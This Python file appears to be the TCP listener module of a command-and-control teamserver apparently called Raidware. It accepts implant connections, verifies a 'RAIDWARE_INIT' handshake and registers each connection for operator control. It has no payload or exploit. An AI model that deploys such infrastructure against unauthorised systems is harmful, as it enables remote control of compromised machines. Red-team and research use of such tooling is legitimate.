''' Imports '''
from Teamserver.listeners import *
from utils.logger import *
from utils.utils import *


from socket import *
from threading import Thread
# from multiprocessing import Process as Thread

class Listener(BaseListener):
    name   = "TCP"
    type   = "Non-Staged"
    LID    = ""
    status = "Not Running"

    ''' Some Variables '''
    thread = None
    sock = socket(AF_INET, SOCK_STREAM)
    sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    bind = 0

    def __init__(self, **kwargs):
        log("Initializing TCP listener", LogLevel.INFO)
        self.options = get_default_config_vars(name=self.name)

        ''' Checking if the port is already being used: '''


        self.curr_port = self.options['port']
        log(f"Current Port: {self.curr_port}")
        if self.curr_port in used_ports.keys():
            ret_msg = f"Port {self.curr_port} is already being used by {used_ports[self.curr_port]}"
            log(ret_msg, LogLevel.ERROR)
            raise Exception(ret_msg)
        
        used_ports[self.curr_port] = self.LID

    def __listen__(self):
    
        def __verify__(conn : socket):
            print()
            log_info("A connection has been received. Verifying the connection...")
            uid = get_random_string()
            self.onSend(uid, socket=conn)
            recv = self.onRecv(socket=conn).split('|')
            try:
                return recv[0] == "RAIDWARE_INIT", recv[1], uid
            except:
                return None

        if not self.bind:
            try:
                self.sock.bind((self.options['host'], self.options['port']))
                self.bind = 1
            except Exception as E:
                log_error(f"Exception: {E}")
                log_error("([GREEN]TCP[RESET]) Failed to bind to the specified address and port.")
                self.sock = None

        if self.sock == None:
            log_error("([GREEN]TCP[RESET]) An error had occurred when creating the socket for listener. Please check...")
            return

        self.sock.listen()
        log_info(f"([GREEN]TCP[RESET]) Listening on [CYAN]{self.options['host']}[RESET]:[CYAN]{self.options['port']}[RESET]")

        while True:
            conn, addr = self.sock.accept()

            ''' Verifying the received connection... '''
            ret = __verify__(conn)
            if not ret[0]:
                log_error("Connection was received but we were unable to validate if it was our own.")
                continue

            log_info(f"([GREEN]TCP[RESET]) Received a connection from {addr[0]}:{addr[1]}")
            print()
            connections[ret[1]] = Connection(UID=ret[2], listener=self, _type=self.type, base=conn, OS=ret[1])


    def onLoad(self):
        log(f"({self.name}) OnLoad function called.")
        try:
            self.thread = Thread(target=self.__listen__, daemon=True)
            self.thread.start()
        except:
            pass

    def onStop(self):
        log(f"({self.name}) OnStop Function Called")
        terminate_thread(self.thread)

    def __dict__(self):
        return {
            'LID' : self.LID,
            'name' : self.name,
            'type' : self.type,
            'status' : self.status,
            'options' : self.options
        }

    def setopts(self, **kwargs):

        log("Inside the setops function of TCP listener", LogLevel.INFO)

        ''' Check if all the keys in kwargs match the keys in self.options '''
        for item in kwargs.keys():
            if item not in self.options.keys():
                return {
                    'status' : 'error',
                    'message' : f'Invalid key "{item}" provided'
                }


        ''' Setting the values '''
        for k, v in kwargs.items():
            self.options[k] = v

        ''' Checking if the port value is being updated: '''
        if 'port' in kwargs.keys():
            new_port = kwargs['port']
            if new_port in used_ports.keys():
                ret_msg = f"Port {new_port} is already being used by {used_ports[new_port]}"
                log(ret_msg, LogLevel.ERROR)
                return {
                    'status' : 'error',
                    'message' : ret_msg
                }
            used_ports[new_port] = self.LID
            used_ports.pop(self.curr_port)
            self.curr_port = new_port

        return {
            'status' : 'success',
            'message' : "Updated the values."
        }

    def onSend(self, msg : str, **kwargs):
        socket = self.sock if 'socket' not in kwargs.keys() else kwargs['socket']

        msg = self.options['begin-delimiter'] + "{" + msg + "}" + self.options['end-delimiter']
        try:
            socket.send(msg.encode())
        except ConnectionResetError:
            log_error(f"Connection lost...")
            return None

    def onRecv(self, **kwargs):

        socket = self.sock if 'socket' not in kwargs.keys() else kwargs['socket']
        try:
            buf = socket.recv(4096).decode()
        except ConnectionResetError:
            log_error(f"Connection lost...")
            return None

        buf = buf.split(self.options['begin-delimiter'])[1].split(self.options['end-delimiter'])[0][1:]
        return buf[:-1]